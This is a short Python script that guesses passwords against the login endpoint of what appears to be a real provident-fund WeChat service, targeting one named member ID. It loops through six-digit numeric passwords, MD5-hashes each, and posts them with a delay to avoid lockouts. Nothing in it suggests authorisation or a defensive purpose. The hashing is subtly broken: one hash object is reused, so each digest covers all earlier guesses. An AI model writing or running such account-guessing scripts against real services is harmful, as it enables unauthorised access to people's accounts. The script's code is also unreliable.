# encoding:utf8

import requests
import hashlib
import time

if __name__ == "__main__":
    url = 'http://weixin.sipspf.org.cn:7003/weixin/web/weixin/pub/login'
    hl = hashlib.md5()
    for i in range(100):
        password = "%06d" % i
        hl.update(password.encode(encoding='utf-8'))
        body = {
            'callback': '',
            'membid': '03746518',
            'password': hl.hexdigest()
        }
        print(body)
        response = requests.post(url, data=body)
        print(response.text)
        time.sleep(10)

